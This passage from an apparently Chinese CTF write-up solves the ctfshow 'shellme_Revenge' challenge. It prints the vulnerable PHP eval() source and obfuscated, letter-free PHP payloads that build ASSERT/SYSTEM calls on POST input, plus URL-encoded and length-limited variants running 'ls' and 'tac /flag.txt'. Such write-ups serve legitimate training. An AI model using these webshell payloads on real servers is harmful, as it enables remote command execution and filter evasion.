class="string">&#x27;avatar.jpg|true&#x27;</span>);</span><br><span class="line">	    window.open(location.href);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">avatar</span></span>()&#123;</span><br><span class="line">		layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;http://xxx.com/x.jpg(其他格式无效)&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改头像&#x27;</span>,</span><br><span class="line">		&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">      layer.close(index);</span><br><span class="line">		  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;xixi|&#x27;</span>+value);</span><br><span class="line">		  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changeavatar&#x27;</span>);</span><br><span class="line">      location.replace(location.href);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">profile</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;page&#x27;</span>);</span><br><span class="line">	    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	    location.replace(location.href);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">changePSW</span></span>()&#123;</span><br><span class="line">		layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;请输入当前密码&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">		&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">		  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+value);</span><br><span class="line">		  layer.close(index);</span><br><span class="line">		  layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;请输入新密码&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">			&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">			  layer.close(index);</span><br><span class="line">			  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>)+<span class="string">&#x27;|&#x27;</span>+value);</span><br><span class="line">			  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changepwd&#x27;</span>);</span><br><span class="line">			  location.replace(location.href);</span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h2><p><img src="https://i.loli.net/2021/08/14/R9IkSsTqpHV1dtf.png" alt="image-20210814203429707"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/?looklook=1</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;    highlight_file(__FILE__);&#125;<span class="keyword">else</span>&#123;    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+3600);&#125;<span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= 107) &#123;        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;            <span class="built_in">eval</span>(<span class="variable">$ctfshow</span>);        &#125;<span class="keyword">else</span>&#123;            <span class="built_in">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);        &#125;    &#125;&#125; <span class="keyword">else</span> &#123;    phpinfo();&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>assert()</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="variable">$_</span>&quot;</span>; // <span class="variable">$_</span>=<span class="string">&#x27;Array&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; // <span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>; // A<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // E <span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // R<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // ASSERT(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>

<p><strong>system()</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=C;//<span class="variable">$_</span>=<span class="variable">$_</span>[0]; //Cprint_r(<span class="variable">$_</span>);<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);//<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // Y<span class="variable">$___</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Sprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Tprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Eprint_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // Mprint_r(<span class="variable">$__</span>);print_r(<span class="variable">$___</span>); //SYSTEM<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;//print_r(<span class="variable">$_</span>);<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$__</span>);<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$____</span>.=<span class="variable">$__</span>;print_r(<span class="variable">$____</span>);//_POSTprint_r(<span class="variable">$___</span>);//SYSTEM<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_])); // SYSTEM(<span class="variable">$_POST</span>[_]);</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php//<span class="variable">$_</span>=[C];<span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));//<span class="variable">$_</span>=C;<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>=<span class="variable">$__</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=_;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=$<span class="variable">$____</span>;<span class="built_in">eval</span>(<span class="variable">$___</span>(<span class="variable">$_</span>[_]));highlight_file(__FILE__);<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];<span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;	<span class="built_in">echo</span> <span class="string">&#x27;111&#x27;</span>;	<span class="built_in">eval</span>(<span class="variable">$a</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get?looklook=1#postctf[show=%24_%3DC%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___%3D%24__%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B&amp;_=ls;</span></span><br></pre></td></tr></table></figure>

<p><strong>长度限制：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get?looklook=1&amp;1=passthru&amp;2=tac /flag.txt# postctf[show=$_=C;$_++;$C=++$_;$_++;$C_=++$_;$_=(C/C.C)&#123;0&#125;;$_++;$_++;$_++;$_++;$_++;$_=_.$C_.$C.++$_;$&#123;$_&#125;&#123;1&#125;($&#123;$_&#125;&#123;2&#125;);</span></span><br></pre></td></tr></table></figure>

